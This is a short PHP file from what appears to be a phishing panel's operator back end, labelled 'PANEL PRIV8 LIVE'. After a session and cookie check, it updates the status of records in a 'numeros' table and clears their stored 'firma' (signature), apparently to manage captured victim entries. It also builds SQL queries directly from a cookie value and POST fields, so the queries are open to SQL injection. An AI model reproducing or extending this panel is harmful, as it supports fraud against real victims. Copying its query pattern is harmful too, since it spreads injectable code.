<?php
/**
* PANEL PRIV8 LIVE
* @package    lock.php
* @author     https://t.me/neo_net
* @copyright  2021
* @version    2.0
* Info :  PHP comment
*/
session_start();
include '../database/db.php';
//include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {

$notification = $connection->query("SELECT * FROM numeros where id='".$_POST['client']."'");
while($row = mysqli_fetch_array($notification)):

$connection->query("UPDATE numeros set status='".$_POST['status']."' where id='".$_POST['client']."'");

if ($_POST['status'] == 2) {
$connection->query("UPDATE numeros set firma=NULL where id='".$_POST['client']."'");
}
endwhile;

}
